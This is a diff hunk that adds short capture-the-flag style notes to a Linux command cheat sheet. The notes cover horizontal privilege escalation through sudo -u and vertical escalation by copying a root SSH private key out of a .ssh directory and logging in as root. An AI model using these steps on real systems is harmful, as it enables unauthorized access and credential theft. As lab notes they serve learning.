@@ -1094,7 +1094,28 @@ Saving to Desktop
 
  pluma File_Name
  
+----------------------------------------------------------------------------------------------------
 
+1) Horizontal Privilege escalation:
+
+sudo -l   for getting other users and their privileges
+
+sudo -u user2 /bin/bash
+
+whoami
+
+cat flag.txt
+
+2) Vertical Privilege escalation:
+
+in .ssh directory we have RSA keys
+
+Copy private key (id_rsa) and in local machine, create new file:
+
+nano id_rsa
+paste the private key (save and exit ctrl +s and ctrl+x)
+chmod 600 id_rsa
+ssh root@TargetIP -p PORTNO -i id_rsa
  
 
  
